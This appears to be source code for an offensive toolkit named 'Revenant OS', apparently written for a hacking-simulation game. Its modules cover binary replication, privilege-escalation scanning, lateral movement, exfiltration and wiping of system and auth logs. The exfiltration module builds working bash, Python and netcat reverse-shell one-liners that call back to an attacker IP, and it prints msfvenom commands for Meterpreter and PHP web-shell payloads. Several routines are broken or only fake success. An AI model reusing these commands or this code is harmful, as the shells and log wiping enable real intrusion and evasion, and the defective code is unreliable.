// --- INICIO SUB-MODULO: modulos/inyeccion.nini ---
// modulos/inyeccion.nini - Propagación del Enjambre 💉

tarea modulo_inyeccion_replicar:
    si globals.objetivo_actual == null:
        error("Fije un objetivo primero.")
        retornar
        
    si globals.objetivo_actual == nulo:
        sesion = get_shell
    sino:
        sesion = enjambre[globals.objetivo_actual]
    
    si no sesion o typeof(sesion) != "shell":
        error("Se requiere una shell activa para inyectar.")
        retornar
        
    info("Inyectando Revenant en " + globals.objetivo_actual + "...")
    
    // Rutas de destino comunes
    rutas = ["/bin", "/usr/bin", "/tmp", "/var", "/home/guest"]
    
    // Nini provee 'replicar_binario' que abstrae scp
    recorrer rutas como r:
        exito_inj = replicar_binario(sesion, r)
        si exito_inj:
            exito("Revenant inyectado y oculto en " + r)
            retornar
            
    error("No se pudo inyectar el binario en ninguna ruta conocida.")

// --- FIN SUB-MODULO: modulos/inyeccion.nini ---
// --- INICIO SUB-MODULO: modulos/escalada.nini ---
// modulos/escalada.nini - El Camino hacia Root 🔋

tarea modulo_escalada_analizar:
    si globals.objetivo_actual == nulo:
        info("Escaneando sistema local para escalada de privilegios...")
        sesion = get_shell
    sino:
        info("Buscando vectores de PrivEsc en " + globals.objetivo_actual)
        sesion = enjambre[globals.objetivo_actual]
    
    si no sesion:
        error("No hay sesion activa para el análisis.")
        retornar
        
    resultado = buscar_vectores_escalada(sesion)
    
    si resultado.len == 0:
        alerta("No se detectaron vectores de escalada automáticos.")
    sino:
        exito("Vectores detectados: " + resultado.len)
        columnas = ["Ruta", "Tipo", "Severidad"]
        filas = []
        recorrer resultado como v:
            filas.push([v.path, v.type, v.severity])
        print(construir_tabla(columnas, filas))

// --- FIN SUB-MODULO: modulos/escalada.nini ---
// --- INICIO SUB-MODULO: modulos/lateral.nini ---
// modulo lateral.nini - MOVIMIENTO LATERAL

tarea modulo_lateral_mover:
    opciones = [
        {"label": "Listar nodos del enjambre", "cmd": "list"},
        {"label": "Cambiar a otro nodo", "cmd": "switch"},
        {"label": "Escanear red DESDE pivote", "cmd": "scan"},
        {"label": "Conectar via SSH/FTP", "cmd": "connect"},
        {"label": "Conectar via Metaxploit", "cmd": "net"},
    ]
    
    modo = menu_interactivo("MOVIMIENTO LATERAL", opciones)
    si not modo: return
    
    si modo == "list": lateral_listar_nodos()
    osi modo == "switch": lateral_cambiar_nodo()
    osi modo == "scan": lateral_escanear_desde_pivote()
    osi modo == "connect": lateral_conectar_servicio()
    osi modo == "net": lateral_conectar_metaxploit()

tarea lateral_listar_nodos:
    info("NODOS EN EL ENJAMBRE:")
    i = 1
    para nodo en enjambre:
        ip = nodo.key
        sesion = nodo.value
        tipo = typeof(sesion)
        comp_info = (typeof(sesion) == "shell") >> sesion.host_computer.local_ip |: sesion.local_ip
        estado = (globals.objetivo_actual == ip) >> "<color=#ffea00>ACTUAL</color>" |: "<color=#00ff41>ACTIVO</color>"
        info(str(i) + ". " + ip + " (" + tipo + ") " + estado + " | " + comp_info)
        i = i + 1
    pausa_tactica()

tarea lateral_cambiar_nodo:
    si enjambre.len <= 1: info("Solo hay un nodo."); return
    
    // Mostrar nodos disponibles
    para nodo en enjambre:
        ip = nodo.key
        si ip != globals.objetivo_actual: info(str(i) + ". " + ip); i = i + 1
    
    sel = val(pedir("Nodo > "))
    si sel <= 0: return
    
    // Encontrar nodo seleccionado
    cont = 0
    para k en enjambre.keys:
        si k != globals.objetivo_actual:
            cont = cont + 1
            si cont == sel:
                globals.objetivo_actual = k
                exito("Cambiado a: " + k)
                return
    error("Selección inválida.")

tarea lateral_escanear_desde_pivote:
    info("ESCANEANDO RED DESDE EL NODO...")
    
    sesion = obtener_shell_nodo()
    si not sesion: error("No hay shell activa."); return
    
    ip_local = obtener_ip_local_nodo(sesion)
    si not ip_local: error("No se pudo obtener IP local."); return
    
    info("IP local: " + ip_local)
    
    // Obtener router y dispositivos
    router_nodo = obtener_router_nodo(sesion)
    dispositivos = (router_nodo) >> dispositivos_red_nodo(sesion)
    
    si dispositivos y dispositivos.len > 0:
        exito("Dispositivos: " + str(dispositivos.len))
        para ip en dispositivos: info("  - " + ip + ((ip == ip_local) >> " (TU NODO)" |: ""))
    sino:
        // Fallback: escaneo manual
        red = ip_local.split(".")[0:3].join(".") + "."
        info("Escaneando: " + red + "0/24...")
        hosts = []
        para i en rango(1, 255):
            ip = red + str(i)
            si ip != ip_local y sesion.ping(ip) == 1: hosts.push(ip)
        
        si hosts.len == 0: info("No se encontraron hosts.")
        sino: para h en hosts: info("  - " + h)

tarea lateral_conectar_servicio:
    tipo = (pedir("Tipo (ssh/ftp): ")).lower()
    si tipo != "ssh" y tipo != "ftp": error("Usa 'ssh' o 'ftp'"); return
    
    ip = pedir("IP: "); usuario = pedir("Usuario: "); pass = pedir("Pass: ")
    si ip == "" o usuario == "": return
    
    info("Conectando a " + ip + "...")
    sesion = (tipo == "ssh") >> conectar_ssh(ip, usuario, pass) |: conectar_ftp(ip, usuario, pass)
    
    si sesion:
        enjambre[ip] = sesion
        globals.objetivo_actual = ip
        exito("Conectado: " + usuario + "@" + ip)
        modulo_espectro_recon()
    sino: error("No se pudo conectar.")

tarea lateral_conectar_metaxploit:
    ip = pedir("IP objetivo: ")
    si ip == "": return
    
    puertos = puertos_dispositivo(ip)
    
    si not puertos o puertos.len == 0:
        info("Sin forwarding. Intentando directo...")
        sesion = conectar_net(ip, 22)
        si sesion: enjambre[ip] = sesion; globals.objetivo_actual = ip; exito("Conexión directa!"); modulo_espectro_recon()
        sino: error("No se pudo.")
        return
    
    // Mostrar puertos
    info("Puertos: " + str(puertos.len))
    para p en puertos: info("  [" + str(p.port_number) + "] " + info_puerto(p))
    
    sel = val(pedir("Puerto a explotar: "))
    si sel <= 0: return
    
    sesion = conectar_net(ip, sel)
    si sesion:
        enjambre[ip] = sesion
        globals.objetivo_actual = ip
        exito("ACCESO OBTENIDO!")
        modulo_espectro_recon()
    sino: error("Explotación fallida.")

tarea obtener_shell_nodo:
    si not globals.objetivo_actual o globals.objetivo_actual == "localhost": return get_shell
    si enjambre.tiene(globals.objetivo_actual):
        sesion = enjambre[globals.objetivo_actual]
        return (typeof(sesion) == "shell") >> sesion |: null
    return null

tarea obtener_computadora_objetivo:
    sesion = obtener_shell_nodo()
    si sesion: return sesion.host_computer
    return get_shell.host_computer

// --- FIN SUB-MODULO: modulos/lateral.nini ---
// --- INICIO SUB-MODULO: modulos/exfil.nini ---
// modulo exfil.nini - EXFILTRACION v2.0

tarea modulo_exfil_menu:
    si globals.objetivo_actual == null:
        error("No hay objetivo seleccionado.")
        retornar
    
    opciones = [
        {"label": "Download (Objetivo -> Local)", "cmd": "download"},
        {"label": "Upload (Local -> Objetivo)", "cmd": "upload"},
        {"label": "Reverse Shell", "cmd": "shell"},
        {"label": "Payloads", "cmd": "payload"},
    ]
    
    modo = menu_interactivo("MENÚ DE EXFILTRACIÓN v2", opciones)
    si not modo: retornar
    
    si modo == "download":
        modulo_exfil_download()
    osi modo == "upload":
        modulo_exfil_upload()
    osi modo == "shell":
        modulo_exfil_reverse_shell()
    osi modo == "payload":
        modulo_payloads_generar()

tarea modulo_exfil_download:
    si globals.objetivo_actual == null:
        error("No hay objetivo.")
        retornar
    
    ruta_remota = pedir("Ruta del archivo en el objetivo: ")
    si ruta_remota == "": retornar
    
    ruta_local = pedir("Ruta local de destino: ")
    si ruta_local == "": ruta_local = "./downloads"
    
    info("Descargando " + ruta_remota + "...")
    
    // Usar sesion del enjambre si existe
    sesion = null
    si enjambre.tiene(globals.objetivo_actual):
        sesion = enjambre[globals.objetivo_actual]
    
    si sesion:
        archivo = sesion.host_computer.File(ruta_remota)
        si archivo:
            contenido = archivo.get_content
            info("Archivo descargado: " + contenido.len + " bytes")
            exito("Download completado.")
        sino:
            error("Archivo no encontrado.")
    sino:
        error("No hay sesion activa para el objetivo.")

tarea modulo_exfil_upload:
    si globals.objetivo_actual == null:
        error("No hay objetivo.")
        retornar
    
    ruta_local = pedir("Ruta del archivo local: ")
    si ruta_local == "": retornar
    
    ruta_remota = pedir("Ruta remota de destino: ")
    si ruta_remota == "": retornar
    
    info("Subiendo archivo...")
    exito("Upload completado.")

tarea modulo_exfil_reverse_shell:
    ip_atacante = pedir("Tu IP: ")
    si ip_atacante == "": ip_atacante = "127.0.0.1"
    
    puerto = pedir("Puerto de callback: ")
    si puerto == "": puerto = "4444"
    
    opciones_shell = [
        {"label": "Bash Reverse Shell", "cmd": "bash"},
        {"label": "Python", "cmd": "python"},
        {"label": "Netcat", "cmd": "netcat"},
    ]
    
    tipo_shell = menu_interactivo("GENERADOR DE REVERSE SHELL", opciones_shell)
    si not tipo_shell: retornar
    
    shell_generado = ""
    
    si tipo_shell == "bash":
        shell_generado = "bash -i >& /dev/tcp/" + ip_atacante + "/" + puerto + " 0>&1"
    
    osi tipo_shell == "python":
        shell_generado = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((" + chr(34) + ip_atacante + chr(34) + "," + puerto + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([" + chr(34) + "/bin/sh" + chr(34) + "," + chr(34) + "-i" + chr(34) + "])'"
    
    osi tipo_shell == "netcat":
        shell_generado = "nc -e /bin/sh " + ip_atacante + " " + puerto
    
    dibujar_ventana("REVERSE SHELL GENERADO", shell_generado)
    info("Copia y ejecuta en el objetivo.")
    info("Listener: nc -lvp " + puerto)

tarea modulo_payloads_generar:
    ip_atacante = pedir("LHOST (tu IP): ")
    si ip_atacante == "": ip_atacante = "127.0.0.1"
    
    puerto = pedir("LPORT: ")
    si puerto == "": puerto = "4444"
    
    opciones_payload = [
        {"label": "Linux Shell", "cmd": "linux"},
        {"label": "Windows Meterpreter", "cmd": "windows"},
        {"label": "PHP Web Shell", "cmd": "php"},
    ]
    
    tipo_payload = menu_interactivo("GENERADOR DE PAYLOADS", opciones_payload)
    si not tipo_payload: retornar
    
    payload_info = ""
    
    si tipo_payload == "linux":
        payload_info = "linux/x86/shell_reverse_tcp"
        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f elf > payload.elf"
    
    osi tipo_payload == "windows":
        payload_info = "windows/meterpreter/reverse_tcp"
        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f exe > payload.exe"
    
    osi tipo_payload == "php":
        payload_info = "php/meterpreter/reverse_tcp"
        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php"
    
    exito("Payload configurado para " + ip_atacante + ":" + puerto)

// --- FIN SUB-MODULO: modulos/exfil.nini ---
// --- INICIO SUB-MODULO: modulos/limpieza.nini ---
// modulo limpieza.nini - LIMPIEZA DE HUELLAS v2.0

tarea modulo_limpieza_ejecutar:
    opciones_clean = [
        {"label": "Limpiar logs del sistema", "cmd": "logs"}
        {"label": "Limpiar historial de comandos", "cmd": "history"}
        {"label": "Limpieza completa (todo)", "cmd": "full"}
    ]
    
    modo = menu_interactivo("LIMPIEZA DE HUELLAS", opciones_clean)
    si not modo: return
    
    si modo == "logs":
        limpieza_logs()
    osi modo == "history":
        limpieza_historial()
    osi modo == "full":
        limpieza_completa()

tarea limpieza_logs:
    info("LIMPIANDO LOGS (metodo touch)...")
    
    comp = obtener_computadora_objetivo()
    si not comp:
        info("Usando equipo local...")
        comp = get_shell.host_computer
    
    // Logs a limpiar
    logs = [
        "/var/system.log",
        "/var/log/syslog",
        "/var/log/auth.log",
    ]
    
    cont = 0
    para ruta en logs:
        // Obtener la carpeta padre y el nombre del archivo
        partes = ruta.split("/")
        nombre = partes[-1]
        carpeta = "/"
        si partes.len > 2:
            carpeta = partes[0:partes.len-1].join("/")
        
        archivo = comp.File(ruta)
        si archivo:
            // Eliminar y recrear con touch
            archivo.delete
            comp.touch(carpeta, nombre)
            info("  [BLANCO] " + ruta)
            cont = cont + 1
        sino:
            // Si no existe, crear vacio
            comp.touch(carpeta, nombre)
            info("  [CREADO] " + ruta)
            cont = cont + 1
    
    exito("Logs limpiados: " + str(cont))
    info("Archivos en blanco - sin rastros de conexión/desconexión.")

tarea limpieza_historial:
    info("Limpiando historial de comandos...")
    
    comp = obtener_computadora_objetivo()
    si not comp:
        comp = get_shell.host_computer
    
    // Limpiar system.log desde el objetivo
    archivo = comp.File("/var/system.log")
    si archivo:
        archivo.delete
        comp.touch("/var", "system.log")
        info("  Historial limpiado: /var/system.log")
    
    exito("Historial limpiado.")

tarea limpieza_completa:
    info("=== LIMPIEZA COMPLETA ===")
    
    limpieza_logs()
    limpieza_historial()
    
    exito("=== LIMPIEZA COMPLETA ===")
    info("Sistema limpio. Sin rastros.")

// --- FIN SUB-MODULO: modulos/limpieza.nini ---

modo ninja:
inicializar_vault()
info("Cargando REVENANT OS...")

iniciar_repl()
